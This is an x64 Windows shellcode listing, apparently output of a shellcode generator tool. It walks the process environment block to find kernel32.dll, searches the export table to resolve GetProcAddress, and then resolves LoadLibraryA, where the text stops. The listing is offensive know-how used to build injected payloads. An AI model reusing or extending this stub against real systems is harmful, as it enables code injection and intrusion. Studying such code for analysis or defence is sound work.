; Shellcode generated using Shellcode Compiler
; https://github.com/NytroRST/ShellcodeCompiler 

sub   RSP, 0x28                        ; 40 bytes of shadow space                  
and   RSP, 0FFFFFFFFFFFFFFF0h          ; Align the stack to a multiple of 16 bytes 

xor rcx, rcx                           ; RCX = 0                                   
mov rax, gs:[rcx + 0x60]               ; RAX = PEB                                 
mov rax, [rax + 0x18]                  ; RAX = PEB->Ldr                            
mov rsi, [rax + 0x20]                  ; RSI = PEB->Ldr.InMemOrder                 
lodsq                                  ; RAX = Second module                       
xchg rax, rsi                          ; RAX = RSI, RSI = RAX                      
lodsq                                  ; RAX = Third(kernel32)                     
mov rbx, [rax + 0x20]                  ; RBX = Base address                        

xor r8, r8                             ; Clear r8                                  
mov r8d, [rbx + 0x3c]                  ; R8D = DOS->e_lfanew offset                
mov rdx, r8                            ; RDX = DOS->e_lfanew                       
add rdx, rbx                           ; RDX = PE Header                           
xor rcx, rcx                           ; RCX = 0                                   
mov cl, 0x88                           ; RCX = 0x88 - Offset export table          
add rcx, rdx                           ; RCX = PE Header + Offset export table     
mov r8d, [rcx]                         ; R8D = Offset export table                 
add r8, rbx                            ; R8 = Export table                         
xor rsi, rsi                           ; Clear RSI                                 
mov esi, [r8 + 0x20]                   ; RSI = Offset namestable                   
add rsi, rbx                           ; RSI = Names table                         
xor rcx, rcx                           ; RCX = 0                                   
mov r9, 0x41636f7250746547             ; GetProcA                                  

Get_Function:                                                                      

inc rcx                                ; Increment the ordinal                     
xor rax, rax                           ; RAX = 0                                   
mov eax, [rsi + rcx * 4]               ; Get name offset                           
add rax, rbx                           ; Get function name                         
cmp [rax], r9                          ; GetProcA ?                                
jnz Get_Function                                                                   
xor rsi, rsi                           ; RSI = 0                                   
mov esi, [r8 + 0x24]                   ; ESI = Offset ordinals                     
add rsi, rbx                           ; RSI = Ordinals table                      
mov cx, [rsi + rcx * 2]                ; Number of function                        
xor rsi, rsi                           ; RSI = 0                                   
mov esi, [r8 + 0x1c]                   ; Offset address table                      
add rsi, rbx                           ; ESI = Address table                       
xor rdx, rdx                           ; RDX = 0                                   
mov edx, [rsi + rcx * 4]               ; EDX = Pointer(offset)                     
add rdx, rbx                           ; RDX = GetProcAddress                      
mov rdi, rdx                           ; Save GetProcAddress in RDI                

mov ecx, 0x41797261                    ; aryA                                      
push rcx                               ; Push on the stack                         
mov rcx, 0x7262694c64616f4c            ; LoadLibr                                  
push rcx                               ; Push on stack                             
mov rdx, rsp                           ; LoadLibraryA                              
mov rcx, rbx                           ; kernel32.dll base address                 
sub rsp, 0x30                                                                      
call rdi                               ; GetProcAddress                            
add rsp, 0x30                                                                      
add rsp, 0x10                          ; Clean space for LoadLibrary string        
mov rsi, rax                           ; LoadLibrary saved in RSI                  

 